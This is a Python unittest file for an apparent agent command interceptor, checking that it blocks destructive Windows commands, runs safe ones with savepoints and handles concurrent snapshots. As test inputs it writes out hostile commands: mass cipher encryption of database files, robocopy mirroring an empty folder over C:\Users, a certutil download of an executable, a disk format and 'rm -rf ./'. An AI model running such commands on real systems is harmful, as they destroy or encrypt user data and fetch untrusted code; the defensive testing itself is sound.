import os, sys, tempfile, threading, unittest
from pathlib import Path
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
sys.path.insert(0, str(Path(__file__).resolve().parent))
import _home  # noqa: F401  (temporary Chrono home for keys and witnesses)
from chrono_agent.interceptor import assess
from chrono_agent import snapshot as snapmod
from chrono_agent.snapshot import SnapshotStore
from chrono_agent import mcp_server


class Rules(unittest.TestCase):
    def test_auditor_commands_block(self):
        for c in ['forfiles /p . /s /m *.db /c "cmd /c cipher /e @path"',
                  r"robocopy C:\empty C:\Users /MIR",
                  "certutil -encode production_secret.env token.txt",
                  "certutil -urlcache -f http://x/a.exe a.exe", "cipher /w:C:\\"]:
            self.assertTrue(assess(c)["blocked"], c)

    def test_benign_still_allowed(self):
        for c in [r"robocopy src dst /E", "certutil -hashfile a.zip SHA256", "cipher /?"]:
            self.assertFalse(assess(c)["blocked"], c)

    def test_format_score_consistent(self):
        self.assertEqual({assess("format.com E: /Q")["score"] for _ in range(50)}, {99})


class Enforcement(unittest.TestCase):
    def setUp(self):
        self.d = tempfile.mkdtemp(); self.cwd = os.getcwd(); os.chdir(self.d)
        SnapshotStore(".").init()

    def tearDown(self):
        os.chdir(self.cwd)

    def test_blocked_never_executes(self):
        cmd = sys.executable + ' -c "open(\'ran.txt\',\'w\')" && rm -rf ./'
        r = mcp_server.call_tool("chrono_run", {"command": cmd})
        self.assertFalse(r["executed"]); self.assertFalse(Path(self.d, "ran.txt").exists())

    def test_safe_runs_with_savepoint(self):
        r = mcp_server.call_tool("chrono_run", {"command": '"%s" -c "print(42)"' % sys.executable})
        self.assertTrue(r["executed"]); self.assertIn("42", r["stdout"]); self.assertTrue(r["savepoint"])

    def test_scan_has_directive(self):
        r = mcp_server.call_tool("chrono_scan", {"command": "format.com E: /Q"})
        self.assertIn("STRICT ENFORCEMENT", r["directive"])


class Resilience(unittest.TestCase):
    def test_retry_survives_transient_access_denied(self):
        n = {"c": 0}
        def flaky(p):
            n["c"] += 1
            if n["c"] < 3:
                raise PermissionError(5, "Access is denied")
            return "ok"
        self.assertEqual(snapmod._retry(flaky, "x"), "ok")

    def test_50_parallel_writers_queue_not_fail(self):
        d = tempfile.mkdtemp(); SnapshotStore(d).init(); errs = []
        def agent(i):
            try:
                Path(d, "a%d.txt" % i).write_text(str(i)); SnapshotStore(d).snapshot("agent %d" % i)
            except Exception as e:
                errs.append(e)
        ts = [threading.Thread(target=agent, args=(i,)) for i in range(50)]
        [t.start() for t in ts]; [t.join() for t in ts]
        self.assertEqual(errs, [])
        s = SnapshotStore(d)
        self.assertEqual(len(s.list()), 50); self.assertTrue(s.audit.verify()["ok"])


if __name__ == "__main__":
    unittest.main()
